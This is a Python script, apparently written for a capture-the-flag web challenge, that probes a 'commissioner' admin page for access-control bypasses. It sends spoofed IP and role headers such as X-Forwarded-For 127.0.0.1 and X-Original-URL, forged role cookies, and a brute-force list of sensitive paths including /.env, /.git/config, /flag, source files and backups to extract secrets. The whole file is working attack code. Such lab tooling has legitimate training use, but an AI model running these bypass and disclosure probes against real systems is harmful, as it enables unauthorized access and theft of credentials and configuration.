#!/usr/bin/env python3
import json, re, urllib.request, urllib.error

BASE = "https://ca31fde9-5707-worldoutter-af91a.mystery-challenges.webverselabs-pro.com"

def req(path, cookie=None, headers=None, method="GET"):
    r = urllib.request.Request(BASE + path, method=method)
    r.add_header("User-Agent", "Mozilla/5.0 recon")
    if cookie: r.add_header("Cookie", cookie)
    for k, v in (headers or {}).items():
        r.add_header(k, v)
    try:
        resp = urllib.request.urlopen(r, timeout=40)
        return resp.status, dict(resp.getheaders()), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, {}, f"ERR {e}"

def denied(b): return ("Commissioner access only" in b) or ("league role is" in b)

print("################ RAW HOMEPAGE ################")
st, h, body = req("/")
print("status", st)
print("HEADERS:", json.dumps(h, indent=1)[:1500])
print("RAW HTML:\n", body)

print("\n################ RAW /commissioner (no cookie) ################")
st, h, body = req("/commissioner")
print("status", st)
print("RAW HTML:\n", body)

# fresh member cookie
st, h, _ = req("/")
mm = re.search(r"wo_session=([^;]+)", h.get("Set-Cookie",""))
member = mm.group(1) if mm else None
print("\nmember cookie:", member)

print("\n################ HEADER / IP BYPASS TESTS on /commissioner ################")
bypass_headers = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "::1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
    {"X-Role": "commissioner"},
    {"X-League-Role": "commissioner"},
    {"X-Commissioner": "true"},
    {"X-Admin": "true"},
    {"Role": "commissioner"},
    {"X-Original-URL": "/commissioner"},
    {"X-Rewrite-URL": "/commissioner"},
    {"Host": "localhost"},
    {"X-Forwarded-Server": "localhost"},
    {"Authorization": "Bearer commissioner"},
    {"Referer": BASE + "/commissioner"},
]
for hd in bypass_headers:
    st, hh, body = req("/commissioner", cookie=(f"wo_session={member}" if member else None), headers=hd)
    print(f"[{'DENIED' if denied(body) else '*** GRANTED ***'}] status={st} hdr={hd} len={len(body)}")
    if not denied(body):
        print("BODY:\n", body[:3000])

print("\n################ COOKIE VARIANTS ################")
cookie_tests = [
    "role=commissioner",
    "wo_role=commissioner",
    f"wo_session={member}; role=commissioner" if member else "role=commissioner",
    "commissioner=true",
    "is_commissioner=true",
    "admin=true",
]
for c in cookie_tests:
    st, hh, body = req("/commissioner", cookie=c)
    print(f"[{'DENIED' if denied(body) else '*** GRANTED ***'}] cookie={c[:60]} status={st}")
    if not denied(body):
        print("BODY:\n", body[:3000])

print("\n################ SOURCE / SECRET DISCLOSURE ################")
paths = [
    "/.env", "/.env.local", "/package.json", "/package-lock.json", "/server.js",
    "/app.js", "/index.js", "/main.js", "/config.js", "/config.json", "/.git/HEAD",
    "/.git/config", "/source", "/src/server.js", "/src/app.js", "/static/app.js",
    "/js/app.js", "/js/main.js", "/dist/main.js", "/bundle.js", "/flag", "/flag.txt",
    "/api/config", "/api/debug", "/debug", "/sitemap.xml", "/.well-known/security.txt",
    "/server.js.bak", "/app.js.bak", "/index.js.map", "/main.js.map", "/README.md",
    "/Dockerfile", "/docker-compose.yml", "/.dockerignore", "/secret", "/secrets",
    "/commissioner/", "/commissioner.js", "/api/commissioner/settings",
]
for p in paths:
    st, hh, body = req(p)
    interesting = st not in (404,) and "Cannot GET" not in body
    tag = "***" if interesting else "   "
    snippet = re.sub(r"\s+", " ", body)[:160]
    print(f"{tag} {st:>4} {p:35} ct={hh.get('Content-Type','')[:25]:25} {snippet}")
    if interesting and any(k in body.lower() for k in ["secret","flag","jwt","password","commissioner"]):
        print("     >>>", re.sub(r"\s+"," ",body)[:500])

print("\nDONE")
